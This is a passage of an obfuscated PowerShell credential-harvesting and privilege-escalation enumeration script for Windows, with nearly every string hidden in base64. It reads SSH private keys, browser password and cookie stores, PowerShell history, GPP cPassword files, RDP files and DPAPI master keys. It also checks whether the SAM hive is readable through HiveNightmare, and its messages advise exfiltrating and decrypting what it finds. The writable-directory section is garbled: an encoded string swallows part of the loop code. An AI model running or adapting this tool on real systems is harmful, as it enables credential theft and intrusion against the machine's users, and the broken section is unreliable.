        Finding (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('VW5hdHRlbmQvU3lzcHJlcCBmaWxlIGZvdW5kOiA='))) + $path + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IC0tIG1heSBjb250YWluIHBsYWludGV4dCBjcmVkZW50aWFscyE=')))) $creds
    }
}

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UG93ZXJTaGVsbCBIaXN0b3J5'))) $creds
$psHistory = ($env + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('OkFQUERBVEFcTWljcm9zb2Z0XFdpbmRvd3NcUG93ZXJTaGVsbFxQU1JlYWRMaW5lXENvbnNvbGVIb3N0X2hpc3RvcnkudHh0'))))
if (Test-Path $psHistory) {
    Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UFNSZWFkTGluZSBoaXN0b3J5'))) { Get-Content $psHistory } $creds
    Finding (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UG93ZXJTaGVsbCBoaXN0b3J5IHJlYWRhYmxlOiA='))) + $psHistory) $creds
}

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SUlTIFdlYiBDb25maWdz'))) $creds
$webConfigs = @(
    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcaW5ldHB1Ylx3d3dyb290XHdlYi5jb25maWc='))),
    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcaW5ldHB1Ylx3d3dyb290XFdlYi5jb25maWc='))),
    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcV2luZG93c1xNaWNyb3NvZnQuTkVUXEZyYW1ld29yazY0XHY0LjAuMzAzMTlcQ29uZmlnXHdlYi5jb25maWc=')))
)
foreach ($wc in $webConfigs) {
    if (Test-Path $wc) {
        Run-Cmd $wc { Get-Content $wc } $creds
        $wcContent = Get-Content $wc -Raw -ErrorAction SilentlyContinue
        if ($wcContent -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cGFzc3dvcmR8Y29ubmVjdGlvblN0cmluZ3xwd2Q=')))) {
            Finding (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UG90ZW50aWFsIGNyZWRlbnRpYWxzIGluIA=='))) + $wc) $creds
        }
    }
}
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RmluZCB3ZWIuY29uZmlnIGZpbGVz'))) { Get-ChildItem C:\ -Recurse -Include ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('d2ViLmNvbmZpZw=='))) -ErrorAction SilentlyContinue | Select-Object -First 10 FullName } $creds

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Q29tbW9uIENyZWRlbnRpYWwgRmlsZXM='))) $creds
$credFiles = @(
    ($env + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('OlVTRVJQUk9GSUxFXC5zc2hcaWRfcnNh')))),
    ($env + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('OlVTRVJQUk9GSUxFXC5zc2hcaWRfZHNh')))),
    ($env + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('OlVTRVJQUk9GSUxFXC5zc2hcYXV0aG9yaXplZF9rZXlz')))),
    ($env + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('OlVTRVJQUk9GSUxFXC5naXRjb25maWc=')))),
    ($env + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('OlVTRVJQUk9GSUxFXEFwcERhdGFcUm9hbWluZ1xmaWxlemlsbGFccmVjZW50c2VydmVycy54bWw=')))),
    ($env + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('OlVTRVJQUk9GSUxFXEFwcERhdGFcUm9hbWluZ1xmaWxlemlsbGFcc2l0ZW1hbmFnZXIueG1s')))),
    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcUHJvZ3JhbSBGaWxlc1xGaWxlWmlsbGEgU2VydmVyXEZpbGVaaWxsYSBTZXJ2ZXIueG1s'))),
    ($env + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('OlVTRVJQUk9GSUxFXEFwcERhdGFcTG9jYWxcR29vZ2xlXENocm9tZVxVc2VyIERhdGFcRGVmYXVsdFxMb2dpbiBEYXRh'))))
)
foreach ($cf in $credFiles) {
    if (Test-Path $cf) {
        Run-Cmd $cf { Get-Content $cf -ErrorAction SilentlyContinue } $creds
        Finding (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Q3JlZGVudGlhbCBmaWxlIGZvdW5kOiA='))) + $cf) $creds
    }
}

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U1NIIEtleXMgKGFsbCB1c2Vycyk='))) $creds
$sshKeyNames = @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aWRfcnNh'))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aWRfZHNh'))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aWRfZWNkc2E='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aWRfZWQyNTUxOQ=='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YXV0aG9yaXplZF9rZXlz'))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('a25vd25faG9zdHM='))))
Get-ChildItem ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcVXNlcnM='))) -ErrorAction SilentlyContinue | ForEach-Object {
    $sshDir = ($($_.FullName) + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XC5zc2g='))))
    if (Test-Path $sshDir) {
        Run-Cmd (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bHMg'))) + $sshDir) { Get-ChildItem $sshDir -Force -ErrorAction SilentlyContinue | Format-Table -AutoSize } $creds
        foreach ($n in $sshKeyNames) {
            $kf = Join-Path $sshDir $n
            if (Test-Path $kf) {
                try {
                    $kc = Get-Content $kf -ErrorAction Stop
                    Run-Cmd $kf { Get-Content $kf } $creds
                    if ($n -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XmlkXw==')))) {
                        Finding (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UmVhZGFibGUgU1NIIFBSSVZBVEUga2V5OiA='))) + $kf) $creds
                    } else {
                        Finding (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UmVhZGFibGUgU1NIIGZpbGU6IA=='))) + $kf) $creds
                    }
                } catch {}
            }
        }
    }
}
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ZmluZCBpZF9yc2EgYW55d2hlcmU='))) { Get-ChildItem C:\ -Recurse -Include ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aWRfcnNh'))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aWRfZWQyNTUxOQ=='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aWRfZWNkc2E='))) -ErrorAction SilentlyContinue | Select-Object -First 10 FullName } $creds

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QnJvd3NlciBDcmVkZW50aWFscw=='))) $creds
$browserPaths = @(
    ($env + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('OkxPQ0FMQVBQREFUQVxHb29nbGVcQ2hyb21lXFVzZXIgRGF0YVxEZWZhdWx0XExvZ2luIERhdGE=')))),
    ($env + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('OkxPQ0FMQVBQREFUQVxHb29nbGVcQ2hyb21lXFVzZXIgRGF0YVxEZWZhdWx0XENvb2tpZXM=')))),
    ($env + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('OkxPQ0FMQVBQREFUQVxNaWNyb3NvZnRcRWRnZVxVc2VyIERhdGFcRGVmYXVsdFxMb2dpbiBEYXRh')))),
    ($env + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('OkxPQ0FMQVBQREFUQVxNaWNyb3NvZnRcRWRnZVxVc2VyIERhdGFcRGVmYXVsdFxDb29raWVz')))),
    ($env + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('OkxPQ0FMQVBQREFUQVxCcmF2ZVNvZnR3YXJlXEJyYXZlLUJyb3dzZXJcVXNlciBEYXRhXERlZmF1bHRcTG9naW4gRGF0YQ==')))),
    ($env + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('OkFQUERBVEFcTW96aWxsYVxGaXJlZm94XFByb2ZpbGVz'))))
)
foreach ($bp in $browserPaths) {
    if (Test-Path $bp) {
        Add-Content $creds (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBbQlJPV1NFUiBEQVRBXSA='))) + $bp)
        Finding (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QnJvd3NlciBjcmVkZW50aWFsIHN0b3JlIHByZXNlbnQ6IA=='))) + $bp + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IC0tIGV4ZmlsIGFuZCBkZWNyeXB0IHdpdGggRFBBUEkvU2hhcnBDaHJvbWU=')))) $creds
    }
}

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UGFzc3dvcmQgU2VhcmNoIGluIENvbW1vbiBMb2NhdGlvbnM='))) $creds
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ZmluZHN0ciBwYXNzd29yZCBpbiBDOlxVc2Vycw=='))) {
    Get-ChildItem ($env + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('OlVTRVJQUk9GSUxF')))) -Recurse -Include ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Ki50eHQ='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Ki5pbmk='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Ki5jZmc='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Ki5jb25maWc='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Ki54bWw='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Ki5wczE='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Ki5iYXQ='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Ki5jbWQ='))) -ErrorAction SilentlyContinue |
    Select-String -Pattern ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cGFzc3dvcmR8cGFzc3dkfHB3ZHxhcGlbXy1dP2tleXxzZWNyZXR8dG9rZW4='))) -CaseSensitive:$false -ErrorAction SilentlyContinue |
    Select-Object -First 20 Path,LineNumber,Line | Out-String -Width 500
} $creds

Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ZmluZHN0ciBwYXNzd29yZCBpbiBDOlx4YW1wcA=='))) {
    Get-ChildItem ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpceGFtcHA='))) -Recurse -Include ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Ki5waHA='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Ki5pbmk='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Ki5jb25m'))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Ki5jb25maWc='))) -ErrorAction SilentlyContinue |
    Select-String -Pattern ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cGFzc3dvcmR8cGFzc3dkfHB3ZA=='))) -CaseSensitive:$false -ErrorAction SilentlyContinue |
    Select-Object -First 20 Path,LineNumber,Line | Out-String -Width 500
} $creds

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U0FNIC8gU1lTVEVNIEhpdmVz'))) $creds
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Q2hlY2sgU0FNIGFjY2Vzc2liaWxpdHk='))) {
    $items = @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcV2luZG93c1xTeXN0ZW0zMlxjb25maWdcU0FN'))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcV2luZG93c1xTeXN0ZW0zMlxjb25maWdcU1lTVEVN'))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcV2luZG93c1xTeXN0ZW0zMlxjb25maWdcU0VDVVJJVFk='))))
    foreach ($i in $items) { if (Test-Path $i) { (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RVhJU1RTOiA='))) + $i) } }
} $creds

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SGl2ZU5pZ2h0bWFyZSAvIFNlcmlvdXNTQU0gKENWRS0yMDIxLTM2OTM0KQ=='))) $creds
$hiveNightmare = $false
$samAcl = icacls ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcV2luZG93c1xTeXN0ZW0zMlxjb25maWdcU0FN'))) 2>$null | Out-String
Add-Content $creds ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBpY2FjbHMgU0FNOg==')))
Add-Content $creds $samAcl
if ($samAcl -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QlVJTFRJTlxcVXNlcnM6LipcKFI=')))) {
    $hiveNightmare = $true
    Finding ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U0FNIGhpdmUgcmVhZGFibGUgYnkgVXNlcnMgKENWRS0yMDIxLTM2OTM0IEhpdmVOaWdodG1hcmUpIC0tIGR1bXAgdmlhIFZTUyBzaGFkb3cgY29weSE='))) $creds
}

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('R3JvdXAgUG9saWN5IFByZWZlcmVuY2VzIChjUGFzc3dvcmQp'))) $creds
$gppFound = $false
$gpPaths = @(
    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcUHJvZ3JhbURhdGFcTWljcm9zb2Z0XEdyb3VwIFBvbGljeVxIaXN0b3J5'))),
    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcRG9jdW1lbnRzIGFuZCBTZXR0aW5nc1xBbGwgVXNlcnNcQXBwbGljYXRpb24gRGF0YVxNaWNyb3NvZnRcR3JvdXAgUG9saWN5XEhpc3Rvcnk=')))
)
foreach ($gp in $gpPaths) {
    if (Test-Path $gp) {
        Get-ChildItem $gp -Recurse -Include ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('R3JvdXBzLnhtbA=='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2VydmljZXMueG1s'))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2NoZWR1bGVkdGFza3MueG1s'))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RGF0YVNvdXJjZXMueG1s'))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UHJpbnRlcnMueG1s'))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RHJpdmVzLnhtbA=='))) -ErrorAction SilentlyContinue | ForEach-Object {
            $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
            if ($content -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Y3Bhc3N3b3JkPSJbXiJdKyI=')))) {
                $gppFound = $true
                Add-Content $creds (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBbR1BQXSA='))) + $($_.FullName))
                Add-Content $creds $content
                Finding (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('R1BQIGNQYXNzd29yZCBmb3VuZCBpbiA='))) + $($_.FullName) + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IC0tIGRlY3J5cHQgd2l0aCBncHAtZGVjcnlwdCE=')))) $creds
            }
        }
    }
}

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2F2ZWQgUkRQIENvbm5lY3Rpb24gRmlsZXM='))) $creds
$rdpFiles = @()
foreach ($searchDir in @(($env + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('OlVTRVJQUk9GSUxFXERvY3VtZW50cw==')))),($env + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('OlVTRVJQUk9GSUxFXERlc2t0b3A=')))),($env + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('OlVTRVJQUk9GSUxFXERvd25sb2Fkcw==')))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcVXNlcnNcUHVibGlj'))))) {
    if (Test-Path $searchDir) {
        Get-ChildItem $searchDir -Recurse -Filter ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Ki5yZHA='))) -ErrorAction SilentlyContinue | ForEach-Object {
            $rdpFiles += $_.FullName
            Run-Cmd $($_.FullName) { Get-Content $_.FullName } $creds
        }
    }
}
if ($rdpFiles.Count -gt 0) {
    Finding ($($rdpFiles.Count) + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IHNhdmVkIC5yZHAgZmlsZShzKSBmb3VuZCAtLSBjaGVjayBmb3Igc3RvcmVkIGNyZWRlbnRpYWxzL3RhcmdldHM=')))) $creds
}

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RFBBUEkgTWFzdGVyIEtleXM='))) $creds
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RFBBUEkgbWFzdGVya2V5cw=='))) { Get-ChildItem ($env + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('OkFQUERBVEFcTWljcm9zb2Z0XFByb3RlY3Q=')))) -Recurse -ErrorAction SilentlyContinue } $creds

Separator $creds
Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAgIFt2XSBTYXZlZCAtPiA='))) + $creds + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG4=')))) -ForegroundColor Green

# ============================================================================
#  8. INSTALLED SOFTWARE
# ============================================================================
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG49PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ=='))) -ForegroundColor Magenta
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBQSEFTRSA4IDogSU5TVEFMTEVEIFNPRlRXQVJF'))) -ForegroundColor Magenta
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0='))) -ForegroundColor Magenta

'' | Out-File $sw_out -Encoding UTF8
Section-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SW5zdGFsbGVkIFNvZnR3YXJl'))) $sw_out

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SW5zdGFsbGVkIFByb2dyYW1zICgzMiAmIDY0LWJpdCk='))) $sw_out
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('NjQtYml0IHByb2dyYW1z'))) { Get-ItemProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SEtMTTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsXCo='))) | Select-Object DisplayName,DisplayVersion,Publisher | Sort-Object DisplayName | Format-Table -AutoSize } $sw_out
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('MzItYml0IHByb2dyYW1z'))) { Get-ItemProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SEtMTTpcU29mdHdhcmVcV293NjQzMk5vZGVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsXCo='))) | Select-Object DisplayName,DisplayVersion,Publisher | Sort-Object DisplayName | Format-Table -AutoSize } $sw_out

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UHJvZ3JhbSBGaWxlcyBDb250ZW50cw=='))) $sw_out
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcUHJvZ3JhbSBGaWxlcw=='))) { Get-ChildItem ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcUHJvZ3JhbSBGaWxlcw=='))) -ErrorAction SilentlyContinue | Format-Table Name,LastWriteTime -AutoSize } $sw_out
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcUHJvZ3JhbSBGaWxlcyAoeDg2KQ=='))) { Get-ChildItem ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcUHJvZ3JhbSBGaWxlcyAoeDg2KQ=='))) -ErrorAction SilentlyContinue | Format-Table Name,LastWriteTime -AutoSize } $sw_out

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SW50ZXJlc3RpbmcgSW5zdGFsbGVkIFNvZnR3YXJl'))) $sw_out
$interestingSW = @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('eGFtcHA='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('d2FtcA=='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bWFtcA=='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bXlzcWw='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cG9zdGdyZXNxbA=='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('dG9tY2F0'))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('amVua2lucw=='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YXBhY2hl'))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bmdpbng='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aWlz'))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cHV0dHk='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('d2luc2Nw'))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('dm5j'))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('dGVhbXZpZXdlcg=='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bm90ZXBhZCsr'))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cHl0aG9u'))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cnVieQ=='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cGVybA=='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Z2l0'))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bm9kZQ=='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Z29sYW5n'))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('amF2YQ=='))))
$installedNames = (Get-ItemProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SEtMTTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsXCo='))) -ErrorAction SilentlyContinue).DisplayName
foreach ($sw in $interestingSW) {
    $match = $installedNames | Where-Object { $_ -match $sw }
    if ($match) {
        Add-Content $sw_out (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBbSU5URVJFU1RJTkddIA=='))) + $match)
    }
}

Separator $sw_out
Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAgIFt2XSBTYXZlZCAtPiA='))) + $sw_out + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG4=')))) -ForegroundColor Green

# ============================================================================
#  9. FILE SYSTEM
# ============================================================================
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG49PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ=='))) -ForegroundColor Magenta
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBQSEFTRSA5IDogRklMRSBTWVNURU0='))) -ForegroundColor Magenta
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0='))) -ForegroundColor Magenta

'' | Out-File $fs -Encoding UTF8
Section-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RmlsZSBTeXN0ZW0='))) $fs

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RHJpdmVz'))) $fs
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('R2V0LVBTRHJpdmU='))) { Get-PSDrive -PSProvider FileSystem | Format-Table -AutoSize } $fs

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('V3JpdGFibGUgRGlyZWN0b3JpZXMgaW4gU3lzdGVtIFBhdGhz'))) $fs
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAgIENoZWNraW5nIGNvbW1vbiBkaXJzIGZvciB3cml0YWJpbGl0eS4uLg=='))) -ForegroundColor Cyan
$systemPaths = @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcV2luZG93c1xTeXN0ZW0zMg=='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcV2luZG93c1xTeXNXT1c2NA=='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcV2luZG93c1xUZW1w'))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcVGVtcA=='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcV2luZG93cw=='))),(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcIikNCmZvcmVhY2ggKA=='))) + $sp + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IGluIA=='))) + $systemPaths + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('KSB7DQogICAgaWYgKFRlc3QtUGF0aCA='))) + $sp + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('KSB7DQogICAgICAgIA=='))) + $testFile + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ID0g'))))$sp\privy_test_$(Get-Random).tmp"
        try {
            [System.IO.File]::WriteAllText($testFile, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('dGVzdA=='))))
            Remove-Item $testFile -Force -ErrorAction SilentlyContinue
            Add-Content $fs (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBbV1JJVEFCTEVdIA=='))) + $sp)
            Finding (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('V3JpdGFibGUgc3lzdGVtIHBhdGg6IA=='))) + $sp) $fs
        } catch {}
    }
}

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UmVjZW50bHkgTW9kaWZpZWQgRmlsZXM='))) $fs
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TW9kaWZpZWQgaW4gbGFzdCAxMCBtaW4='))) {
    Get-ChildItem C:\ -Recurse -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -gt (Get-Date).AddMinutes(-10) -and -not $_.PSIsContainer } |
    Select-Object -First 20 FullName,LastWriteTime | Format-Table -AutoSize
} $fs

Sub-Header ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SW50ZXJlc3RpbmcgRmlsZXM='))) $fs
Run-Cmd ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QmFja3VwL2NvbmZpZyBmaWxlcw=='))) {
    Get-ChildItem C:\ -Recurse -Include ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Ki5iYWs='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Ki5vbGQ='))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Ki5vcmln'))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Ki5zYXZl'))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Ki5iYWNrdXA='))) -ErrorAction SilentlyContinue |
    Select-Object -First 20 FullName | Format-Table -AutoSize
} $fs

